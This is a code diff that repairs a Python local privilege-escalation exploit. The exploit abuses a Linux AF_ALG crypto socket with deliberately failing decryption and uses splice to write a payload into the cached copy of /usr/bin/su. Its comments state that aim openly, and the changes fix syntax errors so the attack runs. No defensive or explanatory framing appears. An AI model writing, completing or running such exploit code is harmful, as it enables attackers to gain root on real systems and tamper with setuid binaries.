@@ -1,3 +1,4 @@
+#!/bin/python3
 import os
 import zlib
 import socket
@@ -49,15 +50,15 @@ def copyFail(file, index, byteData):
     #the ciphertext is fabricated to fail
     #([msg], ALG_SET_OP (3), ALG_SET_IV (2), ALG_SET_ASSOCLEAN (4)
     client.sendmsg([b"A"*4+byteData],
-                    [sockLevel, 3, zeros*4), #SET_OP to decrypt
+                    [(sockLevel, 3, zeros*4), #SET_OP to decrypt
                     (sockLevel,2,b'\x10'+zeros*19), #SET_IV
-                   (sockLevel, 4, b'\x08'+zeros*3), #SET_ASSOCLEN (AAD)
+                    (sockLevel, 4, b'\x08'+zeros*3), #SET_ASSOCLEN (AAD)
                     ], 32768)
     
     read, write = os.pipe()
     fdSplice = os.splice #splice passes by reference
     #splice /usr/bin/su to write
-    fdSplice = (file, write, offset, offset_src=0) 
+    fdSplice(file, write, offset, offset_src=0) 
     #splice AF_ALG socket to read:
     #the payload is written (4 bytes at a time) into the cached copy of su
     fdSplice(read, client.fileno(), offset)
